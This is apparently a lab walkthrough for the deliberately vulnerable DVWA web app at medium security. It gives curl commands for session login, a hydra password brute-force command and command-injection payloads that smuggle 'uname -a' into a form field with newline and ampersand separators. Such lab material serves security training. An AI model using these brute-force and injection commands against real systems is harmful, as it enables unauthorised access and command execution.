
### Target

    https://github.com/ethicalhack3r/DVWA

    Security level: medium

### Prereq

    # get user token
    $ TOKEN=$(curl -c dvwa.session -s http://192.168.56.101/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

    # get session id
    $ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')

    # log in
    $ curl -L -b "PHPSESSID=${PHPSESSID};security=medium" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://192.168.56.101/DVWA/login.php

### Brute Force

    $ wget https://raw.githubusercontent.com/seifreed/dirb/master/wordlists/others/best110.txt

    $ hydra -t 8 -l admin -P best110.txt -vV 192.168.56.101 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=password incorrect:H=Cookie: PHPSESSID=${PHPSESSID};security=medium"

### Command Injection

```
# '\n' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%0auname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    

OR

# '&' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%26uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    
```

